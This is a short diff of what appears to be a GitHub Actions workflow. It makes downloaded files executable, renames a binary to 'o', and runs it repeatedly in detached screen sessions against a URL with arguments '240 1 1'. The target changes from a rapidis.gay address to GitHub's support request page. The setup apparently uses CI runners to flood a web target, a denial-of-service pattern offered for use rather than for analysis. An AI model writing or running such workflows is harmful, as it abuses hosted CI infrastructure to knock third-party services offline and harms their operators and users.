@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv ki o          
           
-          screen -dms ve ./o https://rapidis.gay/6901966783-08007169-7aa0-4196-a7f4-8d2e4454764a? 240 1 1 
-          screen -dms ve ./o https://rapidis.gay/6901966783-08007169-7aa0-4196-a7f4-8d2e4454764a? 240 1 1 
+          screen -dms ve ./o https://support.github.com/request/landing? 240 1 1 
+          screen -dms ve ./o https://support.github.com/request/landing? 240 1 1 
           
-          ./o https://rapidis.gay/6901966783-08007169-7aa0-4196-a7f4-8d2e4454764a 240 1 1  
+          ./o https://support.github.com/request/landing 240 1 1  
 
           
 
